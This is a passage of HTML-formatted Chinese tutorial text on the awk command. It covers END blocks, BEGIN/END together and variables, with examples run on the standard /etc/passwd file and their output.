class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">halt</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-11\"><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-12\"><span class=\"crayon-v\">operator</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">operator</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-13\"><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">100</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-14\"><span class=\"crayon-v\">ftp</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">FTP </span><span class=\"crayon-v\">User</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ftp</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-15\"><span class=\"crayon-v\">nobody</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">99</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">99</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">Nobody</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nologin</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<p><strong>END 关键字使用方法</strong></p>\n<p>awk 的 END 指令和 BEGIN 恰好相反，在 awk 读取并且处理完文件的所有内容行之后，才会执行 END 后面的脚本代码段</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afb8490142449\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk 'END {print \"End file\"}' /etc/passwd\r\nEnd file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb8490142449-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb8490142449-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afb8490142449-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'END {print \"End file\"}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb8490142449-2\"><span class=\"crayon-st\">End</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>一定要多动手在电脑上敲一敲这些命令，对身体好。脑子是个好东西，要多用。。。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afbb887741023\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk 'BEGIN {print \"Start read file\"} {print $0} END {print \"End file\"}' /etc/passwd\r\nStart read file\r\nroot:x:0:0:root:/root:/bin/bash\r\nbin:x:1:1:bin:/bin:/sbin/nologin\r\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\r\nadm:x:3:4:adm:/var/adm:/sbin/nologin\r\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\r\nsync:x:5:0:sync:/sbin:/bin/sync\r\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\r\nhalt:x:7:0:halt:/sbin:/sbin/halt\r\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\r\noperator:x:11:0:operator:/root:/sbin/nologin\r\ngames:x:12:100:games:/usr/games:/sbin/nologin\r\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\r\nnobody:x:99:99:Nobody:/:/sbin/nologin\r\nEnd file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbb887741023-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbb887741023-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'BEGIN {print \"Start read file\"} {print $0} END {print \"End file\"}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-2\"><span class=\"crayon-e\">Start </span><span class=\"crayon-e\">read </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-3\"><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-4\"><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-5\"><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-6\"><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-7\"><span class=\"crayon-v\">lp</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">lp</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-8\"><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sync</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-9\"><span class=\"crayon-v\">shutdown</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">6</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">shutdown</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">shutdown</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-10\"><span class=\"crayon-v\">halt</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">halt</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">halt</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-11\"><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mail</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-12\"><span class=\"crayon-v\">operator</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">operator</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-13\"><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">100</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">games</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-14\"><span class=\"crayon-v\">ftp</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">14</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">FTP </span><span class=\"crayon-v\">User</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ftp</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbb887741023-15\"><span class=\"crayon-v\">nobody</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">99</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">99</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">Nobody</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbb887741023-16\"><span class=\"crayon-st\">End</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p><strong>在 awk 中使用变量</strong></p>\n<p>可以在 awk 脚本中声明和使用变量</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afbf974257674\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{msg=\"hello world\"; print msg}' /etc/passwd\r\nhello world\r\nhello world\r\nhello world\r\nhello world\r\nhello world\r\nawk 声明的变量可以在任何多个花括号脚本中使用\r\n\r\n$ awk 'BEGIN {msg=\"hello world\"} {print msg}' /etc/passwd\r\nhello world\r\nhello world\r\nhello world\r\nhello world\r\nhello world</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afbf974257674-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afbf974257674-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{msg=\"hello world\"; print msg}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-2\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-3\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-4\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-5\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-6\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-7\"><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span>声明的变量可以在任何多个花括号脚本中使用</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-8\"> </div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-9\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'BEGIN {msg=\"hello world\"} {print msg}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-10\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-11\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-12\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afbf974257674-13\"><span class=\"crayon-e\">hello </span><span class=\"crayon-e\">world</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afbf974257674-14\"><span class=\"crayon-e\">hello </span><span class=\"crayon-v\">world</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p><strong>在 awk 中使用数学运算</strong></p>\n<p>在 awk 中，像其他编程语言一样，它也支持一些基本的数学运算操作</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afc2300572600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div 